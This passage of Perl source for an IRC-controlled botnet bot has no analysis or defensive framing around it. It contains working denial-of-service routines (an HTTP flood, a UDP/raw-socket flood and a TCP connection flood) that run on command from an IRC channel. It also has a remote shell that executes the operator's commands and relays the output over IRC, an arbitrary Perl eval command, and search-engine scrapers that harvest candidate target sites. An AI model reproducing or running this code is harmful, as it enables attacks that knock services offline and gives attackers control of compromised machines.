sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4HTTP DDos12:.4|12 Attacking 4 ".$1." 12 on port 80 for 4 ".$2." 12 seconds .");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4HTTP DDos12:.4|12 Attacking done 4 ".$1.".");
}
######################
#  End of HTTPFlood  # 
#                    #
######################
######################
#     UDPFlood       # 
#                    #
######################
if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4UDP DDos12:.4|12 Attacking 4 ".$1." 12 with 4 ".$2." 12 Kb Packets for 4 ".$3." 12 seconds.");
my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
$dtime = 1 if $dtime == 0;
my %bytes;
$bytes{igmp} = $2 * $pacotes{igmp};
$bytes{icmp} = $2 * $pacotes{icmp};
$bytes{o} = $2 * $pacotes{o};
$bytes{udp} = $2 * $pacotes{udp};
$bytes{tcp} = $2 * $pacotes{tcp};
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4UDP DDos12:.4|12 12Results4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 12Kb in4 ".$dtime." 12seconds to4 ".$1.".");
}
exit;
}
}
######################
#  End of Udpflood   # 
#                    #
######################


sub ircase {
my ($kem, $printl, $case) = @_;
  if ($case =~ /^join (.*)/) {
     j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
if ($case =~ /^rejoin\s+(.*)/) {
my $chan = $1;
if ($chan =~ /^(\d+) (.*)/) {
for (my $ca = 1; $ca <= $1; $ca++ ) {
p("$2");
j("$2");
}
}
else {
p("$chan");
j("$chan");
}
}

if ($case =~ /^op/) {
op("$printl", "$kem") if $case eq "op";
my $oarg = substr($case, 3);
op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^deop/) {
deop("$printl", "$kem") if $case eq "deop";
my $oarg = substr($case, 5);
deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^msg\s+(\S+) (.*)/) {
msg("$1", "$2");
}

if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
msg("$2", "$3");
}
}

if ($case =~ /^ctcp\s+(\S+) (.*)/) {
ctcp("$1", "$2");
}

if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
ctcp("$2", "$3");
}
}

if ($case =~ /^nick (.*)/) {
nick("$1");
}

if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
conectar("$2", "$1", 6667);
}

if ($case =~ /^raw (.*)/) {
sendraw("$1");
}

if ($case =~ /^eval (.*)/) {
eval "$1";
}
}


sub shell {
my $printl=$_[0];
my $comando=$_[1];
if ($comando =~ /cd (.*)/) {
chdir("$1") || msg("$printl", "No such file or directory");
return;
}

elsif ($pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) {
exit;

} else {
my @resp=`$comando 2>&1 3>&1`;
my $c=0;
foreach my $linha (@resp) {
  $c++;
  chop $linha;
  sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
  if ($c == "$linas_max") {
    $c=0;
    sleep $sleep;
  }
}
exit;
}
}
}

sub tcpflooder {
my $itime = time;
my ($cur_time);
my ($ia,$pa,$proto,$j,$l,$t);
$ia=inet_aton($_[0]);
$pa=sockaddr_in($_[1],$ia);
$ftime=$_[2];
$proto=getprotobyname('tcp');
$j=0;$l=0;
$cur_time = time - $itime;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
socket($t,PF_INET,SOCK_STREAM,$proto);
connect($t,$pa)||$j--;
$j++;$l++;
}
$l=0;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
shutdown($t,2);
$l++;
}
}



sub udpflooder {
my $iaddr = inet_aton($_[0]);
my $msg = 'A' x $_[1];
my $ftime = $_[2];
my $cp = 0;
my (%pacotes);
$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
return(undef) if $cp == 4;
my $itime = time;
my ($cur_time);
while ( 1 ) {
for (my $porta = 1;
$porta <= 65000; $porta++) {
$cur_time = time - $itime;
last if $cur_time >= $ftime;
send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;


for (my $pc = 3;
$pc <= 255;$pc++) {
next if $pc == 6;
$cur_time = time - $itime;
last if $cur_time >= $ftime;
socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
}
}
last if $cur_time >= $ftime;
}
return($cur_time, %pacotes);
}

sub ctcp {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {

return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
return unless $#_ == 1;
sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
return unless $#_ == 1;
sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
return unless $#_ == 1;
sendraw("MODE $_[0] -o $_[1]");
}

sub j {
&join(@_);
}

sub join {
return unless $#_ == 0;
sendraw("JOIN $_[0]");

}
sub p { part(@_);
}

sub part {
sendraw("PART $_[0]");
}

sub nick {
return unless $#_ == 0;
sendraw("NICK $_[0]");
}

sub quit {
sendraw("QUIT :$_[0]");
}

sub fetch(){
my $rnd=(int(rand(9999)));

my $n= 80;
if ($rnd<5000) { $n<<=1;}
my $s= (int(rand(10)) * $n);
{
my @dominios = ("removed-them-all");
my @str;
foreach $dom  (@dominios)
{
push (@str,"@gstring");
}
my $query="http://www.google.co.id/search?hl=id&q=";
$query.=$str[(rand(scalar(@str)))];
$query.="&num=$n&start=$s";
my @lst=();
sendraw("privmsg #doel :DEBUG only test googling: ".$query."");
my $page = http_query($query);
while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"? class=l>/g){
if ($1 !~ m/google|cache|translate/){
push (@lst,$1);
}
}
return (@lst);
}

sub os(){
my $sito=$_[0];
my $Res=query($sito);
my $type;
my $free;
my $str;
while($Res=~m/<br>OSTYPE:(.+?)\<br>/g){
$type=$1;
}
while($Res=~m/<br>Free:(.+?)\<br>/g){
$free=$1;
}
$str=$type.",".$free;
return $str;
}

sub virgilio(){
my @lst;
my $key = $_[0];
for($b=0;$b<=2000;$b+=100){
my $Vi=("http://search.alice.it/search/cgi/search.cgi?qs=".key($key)."&lr=&Cerca.x=0&Cerca.y=0&Cerca=Cerca");
my $Res=query($Vi);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /virgilio/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub google(){
my @lst;
my $key = $_[0];
for($b=0;$b<=2000;$b+=100){
my $Go=("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://www.altavista.com/web/results?itag=ody&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while ($Res=~ m/href=\"?http:\/\/([^>\"]+)\//g ){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub alltheweb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub fireball(){
my $key=$_[0];
my $inicio=1;
my $pagina=100;
my @lst;
my $av=0;
while($inicio <= $pagina){
my $fireball=("http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=fb_loc&idx=all&enc=utf-8");
my $Res=query($fireball);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
$av=$av+10;
$inicio++;
}
return @lst;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$link=~s/http:\/\///g;
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$hdir=&End($host_dir);
$host=&End($host);
$link=&End($host);
push(@l,$link,$host,$hdir);
return @l;
}

sub End(){
	$string=$_[0];
	$string.="/";
	$string=~s/\/\//\//;
	while($string=~/\/\//){
		$string=~s/\/\//\//;
	}
	return($string);
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}
}

########################################################################################################################
#     ______  __________     ___     _________    ____    __________________                                                                                             
#    /  __  \/ ___   / /    /  /    /  ___/   \  /  / \  /  / __   ___   ___/                                                                         
#   /  /  \   /  /  / /    /  /____/  /__   /  \/  /\  \/  / / /  /  /  /                                                                   
#  /  /   /  /  /  / /    /     __   ___/  /\  /  /  \    / / /  /  /  /                                                                            			
# /  /___/  /__/  / /____/  /\  \/  /__   /  \   /   /   / /_/  /  /  /                                                                                              
#/________/______/______/__/ /__/_____/__/    \_/   /___/______/  /__/                                                                                        
#
########################################################################################################################